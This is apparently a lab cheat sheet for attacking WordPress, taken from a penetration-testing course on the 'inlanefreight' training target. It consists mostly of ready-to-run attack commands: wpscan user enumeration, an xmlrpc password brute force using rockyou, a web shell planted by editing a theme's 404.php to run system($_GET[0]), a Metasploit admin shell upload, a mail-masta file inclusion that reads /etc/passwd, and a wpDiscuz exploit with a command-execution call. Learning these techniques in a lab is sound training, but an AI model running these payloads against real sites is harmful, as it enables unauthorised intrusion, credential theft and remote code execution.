## Enumeration 
`L3pr3ch4un@htb[/htb]$ sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>`

**Enumerate Users**

`wpscan –url http://example.com –enumerate u`
Api:*/wp-json/wp/v2/users*

**Password Brute force**

`L3pr3ch4un@htb[/htb]$ sudo wpscan --password-attack xmlrpc -t 20 -U doug -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local`
**Code Execution**

**Note: Use Alternative theme like  Twenty Nineteen**

`Appearence`>`Theme Editor`>`404.php`>`system($_GET[0]);`

```
L3pr3ch4un@htb[/htb]$ curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```
`msf6 > use exploit/unix/webapp/wp_admin_shell_upload`

## Vulnerabilities

**Note:** We can use the waybackurls tool to look for older versions of a target site using the Wayback Machine. Sometimes we may find a previous version of a WordPress site using a plugin that has a known vulnerability. If the plugin is no longer in use but the developers did not remove it properly, we may still be able to access the directory it is stored in and exploit a flaw.

**Vulnerable Plugins - mail-masta**

`L3pr3ch4un@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`

**Vulnerable Plugins - wpDiscuz**

`version number (7.0.4)`

https://www.exploit-db.com/exploits/49967

`L3pr3ch4un@htb[/htb]$ python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1`

`L3pr3ch4un@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id`

